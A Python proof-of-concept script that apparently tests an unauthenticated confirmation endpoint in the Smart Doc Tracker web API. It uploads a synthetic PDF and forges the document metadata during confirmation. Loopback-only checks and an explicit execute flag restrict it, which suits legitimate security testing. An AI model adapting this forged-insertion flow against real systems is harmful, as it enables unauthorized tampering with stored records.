"""Demonstrate unauthenticated document insertion through the local web API.

This proof of concept is deliberately restricted to an explicit loopback HTTP
endpoint. It uploads a synthetic PDF, waits for local processing, and replaces
the extracted metadata during the unauthenticated confirmation step.
"""

from __future__ import annotations

import argparse
import json
import sys
import tempfile
import time
import uuid
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse
from urllib.request import Request, urlopen

DEFAULT_ENDPOINT = "http://127.0.0.1:8080"
LOOPBACK_HOSTS = frozenset({"127.0.0.1", "localhost", "::1"})


class SimulationError(RuntimeError):
    """Report a safe, actionable failure from the local simulation."""


def validate_endpoint(value: str) -> str:
    """Require a plain HTTP endpoint on loopback with an explicit port."""
    parsed = urlparse(value)
    try:
        port = parsed.port
    except ValueError as exc:
        raise argparse.ArgumentTypeError("The endpoint port is invalid.") from exc
    if (
        parsed.scheme != "http"
        or parsed.hostname not in LOOPBACK_HOSTS
        or port is None
        or parsed.username is not None
        or parsed.password is not None
        or parsed.path not in {"", "/"}
        or parsed.params
        or parsed.query
        or parsed.fragment
    ):
        raise argparse.ArgumentTypeError(
            "Use an explicit loopback HTTP endpoint, for example http://127.0.0.1:8080."
        )
    return value.rstrip("/")


def create_synthetic_pdf(path: Path) -> None:
    """Create a small local PDF containing only unmistakably synthetic text."""
    try:
        import pymupdf
    except ImportError as exc:
        raise SimulationError(
            "PyMuPDF is unavailable. Run the script in the project environment."
        ) from exc

    document = pymupdf.open()
    try:
        page = document.new_page()
        page.insert_text(
            (72, 72),
            "SYNTHETIC SECURITY TEST DOCUMENT - NO REAL PERSONAL DATA",
        )
        page.insert_text(
            (72, 96),
            "This file exists only to test unauthenticated local API access.",
        )
        document.save(path)
    finally:
        document.close()


def encode_multipart_file(path: Path) -> tuple[bytes, str]:
    """Build the bounded multipart body required by the upload endpoint."""
    boundary = f"smart-doc-security-{uuid.uuid4().hex}"
    prefix = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="language"\r\n\r\n'
        "eng\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; '
        f'filename="{path.name}"\r\n'
        "Content-Type: application/pdf\r\n\r\n"
    ).encode("ascii")
    suffix = f"\r\n--{boundary}--\r\n".encode("ascii")
    return prefix + path.read_bytes() + suffix, boundary


def request_json(
    endpoint: str,
    path: str,
    *,
    method: str = "GET",
    body: bytes | None = None,
    content_type: str | None = None,
    timeout: float = 10.0,
) -> Any:
    """Call one endpoint and decode JSON without exposing response internals."""
    headers = {"Accept": "application/json"}
    if content_type is not None:
        headers["Content-Type"] = content_type
    request = Request(
        f"{endpoint}{path}",
        data=body,
        headers=headers,
        method=method,
    )
    try:
        with urlopen(request, timeout=timeout) as response:
            return json.loads(response.read().decode("utf-8"))
    except HTTPError as exc:
        raise SimulationError(
            f"The local API rejected {method} {path} with HTTP {exc.code}."
        ) from exc
    except (URLError, TimeoutError) as exc:
        raise SimulationError("The loopback web application is unavailable.") from exc
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise SimulationError(
            "The local API returned an invalid JSON response."
        ) from exc


def forged_document_payload(marker: str) -> dict[str, Any]:
    """Return valid but explicitly synthetic metadata for persistence."""
    return {
        "document_type": "synthetic_security_test",
        "summary": "Fictitious record inserted by an authorized security test.",
        "expiry_date": "2099-12-31",
        "issue_date": "2099-01-01",
        "extracted_data": {
            "security_test": True,
            "attack_vector": "unauthenticated_pending_document_confirmation",
            "synthetic_marker": marker,
        },
    }


def run_simulation(endpoint: str, timeout: float) -> dict[str, Any]:
    """Execute the upload and forged confirmation workflow."""
    marker = f"SDT-SECURITY-{uuid.uuid4().hex}"
    with tempfile.TemporaryDirectory(prefix="smart-doc-security-") as directory:
        pdf_path = Path(directory) / "synthetic-security-test.pdf"
        create_synthetic_pdf(pdf_path)
        body, boundary = encode_multipart_file(pdf_path)
        upload = request_json(
            endpoint,
            "/api/uploads",
            method="POST",
            body=body,
            content_type=f"multipart/form-data; boundary={boundary}",
        )

    job_id = upload.get("id") if isinstance(upload, dict) else None
    if not isinstance(job_id, str) or not job_id:
        raise SimulationError("The upload response did not contain a job identifier.")

    deadline = time.monotonic() + timeout
    pending_id: str | None = None
    while time.monotonic() < deadline:
        job = request_json(endpoint, f"/api/jobs/{job_id}")
        if not isinstance(job, dict):
            raise SimulationError("The job endpoint returned an invalid response.")
        status = job.get("status")
        if status == "failed":
            raise SimulationError("Local document processing failed.")
        if status == "awaiting_confirmation":
            candidate = job.get("pending_id")
            if isinstance(candidate, str) and candidate:
                pending_id = candidate
                break
            raise SimulationError("The completed job has no pending identifier.")
        time.sleep(0.5)

    if pending_id is None:
        raise SimulationError("Timed out while waiting for local document processing.")

    payload = forged_document_payload(marker)
    confirmed = request_json(
        endpoint,
        f"/api/pending-documents/{pending_id}/confirm",
        method="POST",
        body=json.dumps(payload).encode("utf-8"),
        content_type="application/json",
    )
    document_id = confirmed.get("id") if isinstance(confirmed, dict) else None
    if not isinstance(document_id, str) or not document_id:
        raise SimulationError("The confirmation response has no document identifier.")

    stored = request_json(endpoint, f"/api/documents/{document_id}")
    if (
        not isinstance(stored, dict)
        or stored.get("extracted_data", {}).get("synthetic_marker") != marker
    ):
        raise SimulationError(
            "The forged record could not be verified after insertion."
        )
    return {"document_id": document_id, "synthetic_marker": marker}


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Parse explicit, loopback-only simulation options."""
    parser = argparse.ArgumentParser(
        description=(
            "Simulate unauthenticated insertion of a synthetic document through "
            "the Smart Doc Tracker web API."
        )
    )
    parser.add_argument("--endpoint", type=validate_endpoint, default=DEFAULT_ENDPOINT)
    parser.add_argument(
        "--processing-timeout",
        type=float,
        default=120.0,
        help="Seconds to wait for OCR and local parsing (default: 120).",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Acknowledge that the simulation will insert a synthetic DB record.",
    )
    arguments = parser.parse_args(argv)
    if arguments.processing_timeout <= 0:
        parser.error("--processing-timeout must be positive")
    return arguments


def main(argv: list[str] | None = None) -> int:
    """Run only after explicit acknowledgement of the database mutation."""
    arguments = parse_args(argv)
    if not arguments.execute:
        print(
            "No request sent. Re-run with --execute to insert one clearly marked "
            "synthetic record into the local database."
        )
        return 0
    try:
        result = run_simulation(arguments.endpoint, arguments.processing_timeout)
    except SimulationError as exc:
        print(f"Simulation failed: {exc}", file=sys.stderr)
        return 1
    print("Simulation succeeded: unauthenticated insertion was verified.")
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
